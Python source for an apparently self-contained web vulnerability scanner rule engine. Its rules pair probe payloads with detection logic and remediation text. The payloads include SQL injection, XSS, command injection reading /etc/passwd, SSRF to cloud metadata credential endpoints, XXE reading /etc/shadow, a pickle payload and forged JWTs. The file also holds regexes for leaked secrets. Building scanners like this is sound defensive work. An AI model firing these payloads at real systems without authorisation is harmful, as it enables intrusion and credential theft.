"""
BRAHMASTRA — Narayanastra: Rule Engine
Self-contained vulnerability detection rules. No AI required.

Each Rule has:
  - id, name, severity, cvss, category
  - payloads: list of test strings (cheap → expensive)
  - locations: where to inject (query/body/json/header/cookie)
  - detect(response, payload, baseline, elapsed) → float  (0.0–1.0 confidence)
  - remediation: fix guidance

Confidence thresholds:
  > 0.8  → CONFIRMED — emit finding immediately
  0.3–0.8 → SUSPICIOUS — send to AI if enabled, else emit LOW confidence
  < 0.3  → CLEAN — skip
"""

from __future__ import annotations
import re
import time
from difflib import SequenceMatcher
from dataclasses import dataclass, field
from typing import Optional


# ─── Base Rule ────────────────────────────────────────────────────────────────

@dataclass
class Rule:
    id:          str
    name:        str
    severity:    str        # CRITICAL / HIGH / MEDIUM / LOW
    cvss:        float
    category:    str        # injection / xss / auth / idor / config / info
    payloads:    list[str]
    locations:   list[str]  # query / body / json / header / cookie
    remediation: str

    # Site-wide misconfigurations (security headers, server banner, cookie
    # flags, dangerous methods) are uniform across an entire host. Setting
    # this True tells the engine to emit ONE finding per (rule, host) and
    # collect the rest of the URLs into the finding's evidence as a list,
    # so the dashboard isn't flooded with 300 identical rows.
    dedupe_per_host: bool = False

    def detect(
        self,
        response_body: str,
        response_headers: dict,
        status_code: int,
        payload: str,
        baseline_body: str,
        baseline_status: int,
        elapsed: float,
    ) -> float:
        """
        Return confidence 0.0–1.0 that this vulnerability is present.
        Override in each subclass.
        """
        return 0.0


# ─── Injection Rules ──────────────────────────────────────────────────────────

class SQLiErrorRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "sqli_error",
            name        = "SQL Injection (Error-Based)",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "\" OR \"1\"=\"1",
                "') OR ('1'='1",
                "1' AND SLEEP(0)--",
                "' AND 1=CONVERT(int,@@version)--",
                "'; SELECT 1--",
            ],
            locations   = ["query", "body", "json"],
            remediation = "Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        sql_errors = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark after the character string",
            r"quoted string not properly terminated",
            r"pg::syntaxerror",
            r"ora-\d{5}",
            r"microsoft ole db provider for sql server",
            r"invalid query",
            r"sql syntax.*mysql",
            r"warning.*\Wmysqli?_",
            r"mssql_query\(\)",
            r"odbc sql server driver",
            r"sqlstate\[",
            r"supplied argument is not a valid mysql",
        ]
        body_lower = response_body.lower()
        for pattern in sql_errors:
            if re.search(pattern, body_lower):
                return 0.95
        return 0.0


class SQLiTimeRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "sqli_time",
            name        = "SQL Injection (Time-Based Blind)",
            severity    = "CRITICAL",
            cvss        = 9.1,
            category    = "injection",
            payloads    = [
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND SLEEP(5)--",
                "' AND SLEEP(5)#",
                "1; WAITFOR DELAY '0:0:5'--",
                "' OR SLEEP(5)--",
                "\" OR SLEEP(5)--",
                "'; SELECT pg_sleep(5)--",
                "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            ],
            locations   = ["query", "body", "json"],
            remediation = "Use parameterized queries. Apply query timeouts and rate limiting.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Time-based: if response took >= 4.5s when payload had 5s sleep
        if elapsed >= 4.5:
            return 0.90
        return 0.0


class SQLiBooleanRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "sqli_boolean",
            name        = "SQL Injection (Boolean Blind)",
            severity    = "CRITICAL",
            cvss        = 8.8,
            category    = "injection",
            payloads    = [
                "' AND 1=1--",
                "' AND 1=2--",
                "1 AND 1=1",
                "1 AND 1=2",
            ],
            locations   = ["query", "body", "json"],
            remediation = "Use parameterized queries / prepared statements.",
        )
        self._true_sim:  Optional[float] = None   # similarity of TRUE response to baseline

    def reset_state(self):
        self._true_sim = None

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Boolean blind: TRUE condition returns data (similar to baseline),
        # FALSE condition returns nothing (diverges from baseline).
        # Both compared against *baseline_body* — no cross-param state bleed.
        sim = _text_similarity(response_body, baseline_body)

        if "1=1" in payload:
            # TRUE payload — should look like baseline (rows returned)
            self._true_sim = sim
        elif "1=2" in payload and self._true_sim is not None:
            # FALSE payload — if true looked like baseline but false diverges → SQLi
            if self._true_sim > 0.85 and sim < 0.45:
                return 0.85
        return 0.0


class SQLiUnionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "sqli_union",
            name        = "SQL Injection (UNION-Based)",
            severity    = "CRITICAL",
            cvss        = 9.5,
            category    = "injection",
            payloads    = [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "1' UNION SELECT 1,2,3--",
                "' UNION SELECT 'BRMSTR7734X','test','x'--",
            ],
            locations   = ["query", "body"],
            remediation = "Use parameterized queries. Whitelist expected output columns.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Look for unique probe string reflected back — indicates UNION injection success
        if "brmstr7734x" in response_body.lower():
            return 0.98
        # Body grew substantially with UNION (data appended) AND differs from baseline
        if (len(response_body) > len(baseline_body) * 1.5 and
                status_code == 200 and
                _text_similarity(response_body, baseline_body) < 0.6):
            return 0.70
        return 0.0


class NoSQLRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "nosql",
            name        = "NoSQL Injection",
            severity    = "CRITICAL",
            cvss        = 9.0,
            category    = "injection",
            payloads    = [
                '{"$gt": ""}',
                '{"$ne": null}',
                '{"$gt": "", "$lt": "z"}',
                '{"$regex": ".*"}',
                "' || '1'=='1",
                '{"$where": "1==1"}',
            ],
            locations   = ["json", "body", "query"],
            remediation = "Sanitize all operator keys ($gt, $ne, $where). Use strict schema validation.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # NoSQL injection: auth bypass (got 200 where baseline was 401/403)
        if baseline_status in (401, 403) and status_code == 200:
            return 0.90
        # Or body grew significantly (data returned)
        if status_code == 200 and len(response_body) > len(baseline_body) * 2 and len(response_body) > 200:
            return 0.65
        return 0.0


class XSSReflectedRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "xss_reflected",
            name        = "Cross-Site Scripting (Reflected)",
            severity    = "HIGH",
            cvss        = 7.4,
            category    = "xss",
            payloads    = [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                "javascript:alert(1)",
                "'><svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<img src=1 onerror=alert(document.domain)>",
                '"autofocus onfocus=alert(1) x="',
            ],
            locations   = ["query", "body"],
            remediation = "HTML-encode all user-controlled output. Implement strict CSP.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Check if payload is reflected unescaped in response
        content_type = response_headers.get("content-type", "").lower()
        if "html" not in content_type and "text" not in content_type:
            return 0.0

        # Strip basic HTML encoding — if still reflected raw
        if payload in response_body:
            return 0.92
        # Check for partial reflection (script tag without full payload)
        if "<script>" in response_body.lower() and "alert" in response_body.lower():
            return 0.80
        # img onerror or svg onload reflected
        if re.search(r"onerror\s*=|onload\s*=", response_body, re.IGNORECASE):
            if any(p[:10] in response_body for p in self.payloads):
                return 0.75
        return 0.0


class SSTIRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "ssti",
            name        = "Server-Side Template Injection",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "${{'abc'|upper}}",
                "#{7*7}",
                "*{7*7}",
                "@{7*7}",
            ],
            locations   = ["query", "body", "json", "header"],
            remediation = "Never pass raw user input to template engines. Use sandboxed templates.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # SSTI: math expression evaluated — look for 49 in response
        if "49" in response_body and "49" not in baseline_body:
            return 0.95
        # {{7*'7'}} → "7777777" in Jinja2
        if "7777777" in response_body:
            return 0.98
        return 0.0


class CommandInjectionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "cmdi",
            name        = "Command Injection",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; whoami",
                "| whoami",
                "; cat /etc/passwd",
                "& whoami",
                "%0Aid",
                "1; id",
            ],
            locations   = ["query", "body", "json"],
            remediation = "Avoid shell execution with user input. Use language-native APIs. Whitelist inputs.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Look for uid= output (Linux id/whoami)
        if re.search(r"uid=\d+\(\w+\)", response_body):
            return 0.99
        if re.search(r"root:x:0:0", response_body):
            return 0.99
        if re.search(r"\b(root|daemon|www-data|apache|nginx)\b", response_body) and "id" in payload:
            return 0.65
        return 0.0


class LFIRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "lfi",
            name        = "Path Traversal / Local File Inclusion",
            severity    = "HIGH",
            cvss        = 7.5,
            category    = "injection",
            payloads    = [
                "../../../../etc/passwd",
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../../windows/win.ini",
                "../../../../boot.ini",
                "/etc/passwd",
                "....\\....\\....\\windows\\win.ini",
            ],
            locations   = ["query", "body"],
            remediation = "Validate and canonicalize all file paths. Use chroot jails. Whitelist allowed files.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if re.search(r"root:x:0:0:", response_body):
            return 0.99
        if re.search(r"\[fonts\]", response_body) or re.search(r"\[boot loader\]", response_body.lower()):
            return 0.99
        if re.search(r"(daemon|www-data|nobody):x:\d+:\d+:", response_body):
            return 0.90
        return 0.0


class SSRFRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "ssrf",
            name        = "Server-Side Request Forgery",
            severity    = "CRITICAL",
            cvss        = 9.1,
            category    = "injection",
            payloads    = [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/metadata/v1/",
                "http://100.100.100.200/latest/meta-data/",
                "http://127.0.0.1/",
                "http://localhost/",
                "http://[::1]/",
                "http://0.0.0.0/",
                "dict://127.0.0.1:6379/info",
            ],
            locations   = ["query", "body", "json"],
            remediation = "Validate/block internal URLs. Implement allowlist for outbound requests. Disable IMDSv1.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        body = response_body or ""
        # Anti-FP: Remove reflected payload URL from response before analysis
        # (prevents reflected search params from being confused with SSRF)
        cleaned = body.replace(payload, '')
        cleaned_lower = cleaned.lower()

        # AWS metadata content patterns (NOT just the URL — actual metadata values)
        aws_patterns = [
            r"ami-[a-f0-9]{8,17}",              # AMI ID
            r"i-[a-f0-9]{8,17}",                # Instance ID
            r"sg-[a-f0-9]{8,17}",               # Security group ID
            r"subnet-[a-f0-9]{8,17}",           # Subnet ID
            r"(m[0-9]|c[0-9]|t[0-9]|r[0-9])\.\w+",  # Instance type
            r"arn:aws:[a-z]+:",                  # AWS ARN
            r"AKIA[0-9A-Z]{16}",                # AWS Access Key
            r"security-credentials/\w+",         # IAM role name
        ]
        for pat in aws_patterns:
            if re.search(pat, cleaned):
                return 0.95

        # GCP metadata patterns
        gcp_patterns = [
            r"project/project-id",
            r"instance/zone",
            r"service-accounts/.+/token",
            r"computeMetadata/v1",
        ]
        for pat in gcp_patterns:
            if re.search(pat, cleaned_lower):
                return 0.90

        # Azure metadata
        if re.search(r"compute/vmId|network/interface|azureProfile", cleaned_lower):
            return 0.90

        # Internal service: must return STRUCTURALLY different content
        if status_code == 200 and "127.0.0.1" in payload or "localhost" in payload:
            # Response must differ significantly from baseline AND not just reflect the URL
            sim = _text_similarity(cleaned, baseline_body, payload)
            ct = response_headers.get("content-type", "")
            base_ct = ""  # We don't have baseline headers, so check content change
            if sim < 0.4 and len(cleaned) > 100:
                return 0.70
        return 0.0


class XXERule(Rule):
    def __init__(self):
        super().__init__(
            id          = "xxe",
            name        = "XML External Entity Injection",
            severity    = "CRITICAL",
            cvss        = 9.1,
            category    = "injection",
            payloads    = [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            ],
            locations   = ["body", "json"],
            remediation = "Disable external entity processing. Use safe XML parsers. Validate/sanitize XML input.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if re.search(r"root:x:0:0:", response_body):
            return 0.99
        if re.search(r"(daemon|www-data):x:\d+:", response_body):
            return 0.90
        # Connection error to external host — SSRF via XXE
        if status_code in (500, 502, 503) and status_code != baseline_status:
            return 0.55
        return 0.0


class OpenRedirectRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "open_redirect",
            name        = "Open Redirect",
            severity    = "MEDIUM",
            cvss        = 6.1,
            category    = "config",
            payloads    = [
                "https://evil.brahmastra.test",
                "//evil.brahmastra.test",
                "/\\evil.brahmastra.test",
                "https:evil.brahmastra.test",
                "javascript:alert(document.domain)",
                "https://evil.brahmastra.test/%2f..",
            ],
            locations   = ["query"],
            remediation = "Validate redirect URLs against an allowlist. Never redirect to arbitrary user-controlled URLs.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code in (301, 302, 303, 307, 308):
            location = response_headers.get("location", "")
            if "evil.brahmastra.test" in location:
                return 0.99
            if location and not location.startswith("/") and "brahmastra" not in location:
                return 0.75
        return 0.0


class CORSRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "cors",
            name        = "CORS Misconfiguration",
            severity    = "MEDIUM",
            cvss        = 6.5,
            category    = "config",
            payloads    = ["evil.brahmastra.test"],  # Injected as Origin header
            locations   = ["header"],
            remediation = "Validate Origin against a strict allowlist. Never reflect arbitrary Origins.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        acao = response_headers.get("access-control-allow-origin", "")
        acac = response_headers.get("access-control-allow-credentials", "").lower()
        if acao == "*" and acac == "true":
            return 0.90
        if "evil.brahmastra.test" in acao:
            return 0.95
        if acao == "*":
            return 0.60
        return 0.0


class CRLFRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "crlf",
            name        = "CRLF Injection / Response Splitting",
            severity    = "MEDIUM",
            cvss        = 6.1,
            category    = "injection",
            payloads    = [
                "%0d%0aX-Brahmastra: injected",
                "%0aX-Brahmastra: injected",
                "\r\nX-Brahmastra: injected",
                "%0d%0aSet-Cookie: brahmastra=injected",
                "%E5%98%8A%E5%98%8DX-Brahmastra: injected",
            ],
            locations   = ["query", "header"],
            remediation = "Strip/encode CR and LF characters from all user input used in HTTP headers.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if "x-brahmastra" in response_headers:
            return 0.98
        if "brahmastra" in response_headers.get("set-cookie", "").lower():
            return 0.98
        return 0.0


class HostHeaderRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "host_header",
            name        = "Host Header Injection",
            severity    = "MEDIUM",
            cvss        = 5.4,
            category    = "config",
            payloads    = [
                "evil.brahmastra.test",
                "evil.brahmastra.test:80@target",
            ],
            locations   = ["header"],
            remediation = "Validate Host header against a strict allowlist. Use absolute URLs in redirects.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Injected host appears in Location header or response body links
        if "evil.brahmastra.test" in response_headers.get("location", ""):
            return 0.95
        if "evil.brahmastra.test" in response_body:
            return 0.85
        return 0.0


# ─── JWT / Auth Rules ─────────────────────────────────────────────────────────

class JWTNoneRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "jwt_none",
            name        = "JWT Algorithm None Attack",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "auth",
            payloads    = [
                # Unsigned JWT with alg:none — generated dynamically per request
                "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.",
            ],
            locations   = ["header"],
            remediation = "Explicitly reject alg:none. Use an allowlist of accepted algorithms.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # If server accepted alg:none JWT and returned 200
        if status_code == 200 and baseline_status in (401, 403):
            return 0.95
        if status_code == 200 and "admin" in response_body.lower():
            return 0.75
        return 0.0


class JWTWeakSecretRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "jwt_weak",
            name        = "JWT Weak Secret (Brute-Force)",
            severity    = "HIGH",
            cvss        = 8.8,
            category    = "auth",
            payloads    = [
                # Tokens signed with common secrets — generated dynamically
                "secret", "password", "123456", "admin", "key", "jwt_secret",
                "your-256-bit-secret", "changeme", "supersecret",
            ],
            locations   = ["header"],
            remediation = "Use cryptographically random secrets (>= 256 bits). Rotate regularly.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Detected if crafted token was accepted
        if status_code == 200 and baseline_status in (401, 403):
            return 0.90
        return 0.0


class JWTKidRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "jwt_kid",
            name        = "JWT kid Path Traversal",
            severity    = "HIGH",
            cvss        = 8.1,
            category    = "auth",
            payloads    = [
                "../../../dev/null",
                "../../../../../../dev/null",
                "/dev/null",
            ],
            locations   = ["header"],
            remediation = "Validate kid against a key store. Reject path traversal patterns in kid.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code == 200 and baseline_status in (401, 403):
            return 0.90
        return 0.0


# ─── AuthZ / Access Control ───────────────────────────────────────────────────

class IDORRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "idor",
            name        = "Insecure Direct Object Reference (IDOR/BOLA)",
            severity    = "HIGH",
            cvss        = 8.0,
            category    = "idor",
            payloads    = ["1", "2", "0", "-1", "99999"],
            locations   = ["query", "body"],
            remediation = "Implement object-level authorization checks. Use indirect references (UUIDs).",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Different user data returned — body changed but still 200
        if status_code == 200 and baseline_status == 200:
            similarity = _text_similarity(response_body, baseline_body)
            if 0.1 < similarity < 0.75:  # Different data, similar structure
                return 0.80
        return 0.0


class BFLARule(Rule):
    def __init__(self):
        super().__init__(
            id          = "bfla",
            name        = "Broken Function Level Authorization",
            severity    = "HIGH",
            cvss        = 8.1,
            category    = "auth",
            payloads    = [
                "/admin", "/api/admin", "/manage", "/dashboard/admin",
                "/api/v1/admin", "/api/v2/admin", "/admin/users",
                "/admin/settings", "/admin/delete", "/superuser",
            ],
            locations   = ["query"],
            remediation = "Enforce function-level authorization checks on every endpoint.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Anti-FP: Redirect to login = access control WORKING, not broken
        if status_code in (301, 302, 303, 307, 308):
            return 0.0
        location = (response_headers or {}).get("location", "").lower()
        if "login" in location or "signin" in location or "auth" in location:
            return 0.0

        # Anti-FP: 401/403 = access control working
        if status_code in (401, 403):
            return 0.0

        # Anti-FP: Response is same as homepage/baseline (not admin content)
        if status_code == 200 and len(response_body or "") > 100:
            sim = _text_similarity(response_body, baseline_body, payload)
            if sim > 0.85:
                return 0.0  # Same content as non-admin page = not actually admin

            # Check for admin-specific keywords
            body_lower = (response_body or "").lower()
            admin_keywords = ["admin panel", "dashboard", "manage users", "settings",
                            "configuration", "system admin", "user management"]
            has_admin_content = any(kw in body_lower for kw in admin_keywords)
            if has_admin_content:
                return 0.85
            return 0.55  # Different content but no admin keywords - suspicious

        return 0.0


class CSRFRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "csrf",
            name        = "Cross-Site Request Forgery",
            severity    = "MEDIUM",
            cvss        = 6.5,
            category    = "config",
            payloads    = [""],   # No payload — test POST without CSRF token
            locations   = ["body"],
            remediation = "Implement SameSite=Strict cookies. Use CSRF tokens on all state-changing requests.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # State-changing POST without CSRF token succeeded
        if status_code in (200, 201, 204) and "csrf" not in response_body.lower():
            return 0.60
        return 0.0


# ─── Info Disclosure ──────────────────────────────────────────────────────────

class SecretsInJSRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "secrets_js",
            name        = "Secrets / API Keys in JavaScript",
            severity    = "HIGH",
            cvss        = 7.5,
            category    = "info",
            payloads    = [],
            locations   = [],
            remediation = "Remove secrets from client-side code. Use server-side token exchange. Audit all JS files.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        patterns = [
            r"AKIA[0-9A-Z]{16}",                           # AWS Access Key
            r"sk-[a-zA-Z0-9]{20,}",                        # OpenAI API key
            r"AIza[0-9A-Za-z\-_]{35}",                     # Google API key
            r"['\"](?:api[_-]?key|apikey|secret|token)['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_\-]{16,}['\"]",
            r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",   # Private key
            r"password\s*=\s*['\"][^'\"]{8,}['\"]",        # Hardcoded password
            r"(?:client_secret|app_secret|auth_token)\s*[:=]\s*['\"][a-zA-Z0-9_\-]{10,}['\"]",
            r"ghp_[a-zA-Z0-9]{36}",                        # GitHub personal access token
            r"ghs_[a-zA-Z0-9]{36}",                        # GitHub token
        ]
        for pattern in patterns:
            if re.search(pattern, response_body):
                return 0.90
        return 0.0


class DirListingRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "dir_listing",
            name        = "Directory Listing Enabled",
            severity    = "MEDIUM",
            cvss        = 5.3,
            category    = "info",
            payloads    = [],
            locations   = [],
            remediation = "Disable directory listing in web server config (Options -Indexes in Apache).",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code == 200:
            body_lower = response_body.lower()
            if re.search(r"index of /", body_lower):
                return 0.95
            if re.search(r"<title>\s*index of", body_lower):
                return 0.95
            if "parent directory" in body_lower and ("last modified" in body_lower or "size" in body_lower):
                return 0.85
        return 0.0


class InfoDisclosureRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "info_disclosure",
            name        = "Information Disclosure (Debug / Stack Trace)",
            severity    = "LOW",
            cvss        = 4.3,
            category    = "info",
            payloads    = ["'", '"', "<", "{{", "${"],
            locations   = ["query", "body"],
            remediation = "Disable debug mode in production. Catch exceptions and return generic error messages.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code in (500, 502, 503):
            body_lower = response_body.lower()
            disclosure_patterns = [
                r"traceback \(most recent call last\)",   # Python
                r"at \w+\.\w+\([\w.]+:\d+\)",            # Java stack trace
                r"exception in thread",
                r"stack trace:",
                r"php fatal error",
                r"warning: include",
                r"parse error.*on line \d+",
                r"django.core.exceptions",
                r"laravel",
                r"rails server",
            ]
            for pattern in disclosure_patterns:
                if re.search(pattern, body_lower):
                    return 0.88
        # Version disclosure in headers
        server = response_headers.get("server", "").lower()
        x_powered = response_headers.get("x-powered-by", "").lower()
        if re.search(r"\d+\.\d+", server) or re.search(r"\d+\.\d+", x_powered):
            return 0.55
        return 0.0


class DeserializationRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "deserialization",
            name        = "Insecure Deserialization",
            severity    = "CRITICAL",
            cvss        = 9.8,
            category    = "injection",
            payloads    = [
                # Java serialization magic bytes (base64)
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
                # PHP object injection
                'O:8:"stdClass":0:{}',
                'a:1:{s:4:"test";s:4:"test";}',
                # Python pickle
                "cos\nsystem\n(S'id'\ntR.",
            ],
            locations   = ["body", "json", "cookie"],
            remediation = "Avoid deserializing untrusted data. Use JSON instead of native serialization. Implement integrity checks.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Java deserialization error
        if re.search(r"java\.io\.NotSerializableException|ClassNotFoundException", response_body):
            return 0.70
        if re.search(r"uid=\d+\(\w+\)", response_body):  # RCE via deserialization
            return 0.99
        return 0.0


class PrototypePollutionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "prototype_pollution",
            name        = "Prototype Pollution",
            severity    = "HIGH",
            cvss        = 7.3,
            category    = "injection",
            payloads    = [
                '{"__proto__": {"admin": true}}',
                '{"constructor": {"prototype": {"admin": true}}}',
                "__proto__[admin]=true",
                "constructor[prototype][admin]=true",
            ],
            locations   = ["json", "body", "query"],
            remediation = "Sanitize keys. Use Object.create(null). Validate JSON schemas strictly.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        # Prototype pollution confirmed if admin flag appeared in response
        if status_code == 200 and "admin" in response_body.lower() and baseline_status in (401, 403):
            return 0.85
        if status_code == 200 and '"admin":true' in response_body:
            return 0.80
        return 0.0


class GraphQLIntrospectionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "graphql_introspection",
            name        = "GraphQL Introspection Exposed",
            severity    = "MEDIUM",
            cvss        = 5.3,
            category    = "info",
            payloads    = [
                '{"query":"{__schema{types{name}}}"}',
                '{"query":"query{__schema{queryType{name}}}"}',
            ],
            locations   = ["json", "body"],
            remediation = "Disable introspection in production. Use query depth limiting and field allowlists.",
        )

    def detect(self, response_body, response_headers, status_code, payload, baseline_body, baseline_status, elapsed):
        if status_code == 200 and "__schema" in response_body:
            return 0.95
        if status_code == 200 and "types" in response_body and "queryType" in response_body:
            return 0.90
        return 0.0


# ─── New Rules: Config / Headers (passive) ───────────────────────────────────

class CookieSecurityRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "cookie_security",
            name        = "Cookie Security Flags Missing",
            severity    = "MEDIUM",
            cvss        = 5.3,
            category    = "config",
            payloads    = [],
            locations   = [],
            remediation = (
                "Set HttpOnly flag to prevent JavaScript access. "
                "Set Secure flag to restrict cookies to HTTPS. "
                "Set SameSite=Strict or SameSite=Lax to prevent CSRF."
            ),
            dedupe_per_host = True,
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        # httpx collapses Set-Cookie duplicates — split on \n to recover individual values
        raw = response_headers.get("set-cookie", "")
        if not raw:
            return 0.0
        cookies = raw.split("\n") if "\n" in raw else [raw]
        max_conf = 0.0
        for cookie in cookies:
            cl = cookie.lower()
            is_session = bool(re.search(r'\b(session|sess|sid|auth|token|jwt)\b', cl))
            if "httponly" not in cl:
                max_conf = max(max_conf, 0.85 if is_session else 0.70)
            if "secure" not in cl:
                max_conf = max(max_conf, 0.75)
            if "samesite" not in cl:
                max_conf = max(max_conf, 0.65)
        return max_conf


class SecurityHeadersRule(Rule):
    _REQUIRED = [
        "content-security-policy",
        "strict-transport-security",
        "x-frame-options",
        "x-content-type-options",
        "permissions-policy",
        "referrer-policy",
    ]

    def __init__(self):
        super().__init__(
            id          = "security_headers",
            name        = "Security Headers Missing",
            severity    = "MEDIUM",
            cvss        = 5.4,
            category    = "config",
            payloads    = [],
            locations   = [],
            remediation = (
                "Add: Content-Security-Policy, Strict-Transport-Security, "
                "X-Frame-Options: DENY, X-Content-Type-Options: nosniff, "
                "Permissions-Policy, Referrer-Policy: no-referrer."
            ),
            dedupe_per_host = True,
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        if "html" not in response_headers.get("content-type", "").lower():
            return 0.0
        header_keys = {k.lower() for k in response_headers}
        missing = [h for h in self._REQUIRED if h not in header_keys]
        if len(missing) >= 3:
            return 0.80
        if 1 <= len(missing) <= 2:
            return 0.50
        return 0.0


class DangerousMethodsRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "dangerous_methods",
            name        = "Dangerous HTTP Methods Enabled",
            severity    = "MEDIUM",
            cvss        = 5.3,
            category    = "config",
            payloads    = [],
            locations   = [],
            remediation = (
                "Disable TRACE globally. Restrict PUT/DELETE to authenticated "
                "API endpoints only. Block unused methods via firewall/WAF."
            ),
            dedupe_per_host = True,
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        allow = response_headers.get("allow", "").upper()
        if not allow:
            return 0.0
        if "TRACE" in allow:
            return 0.90
        if "PUT" in allow or "DELETE" in allow:
            return 0.80
        return 0.0


class ServerBannerRule(Rule):
    _VERSION_RE = re.compile(
        r'(apache|nginx|iis|php|tomcat|express|lighttpd|gunicorn|uvicorn)[/\s]([\d.]+)',
        re.IGNORECASE,
    )

    def __init__(self):
        super().__init__(
            id          = "server_banner",
            name        = "Server Version Disclosure",
            severity    = "LOW",
            cvss        = 3.1,
            category    = "info",
            payloads    = [],
            locations   = [],
            remediation = (
                "Remove or obscure Server and X-Powered-By headers. "
                "Configure your web server to suppress version strings."
            ),
            dedupe_per_host = True,
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
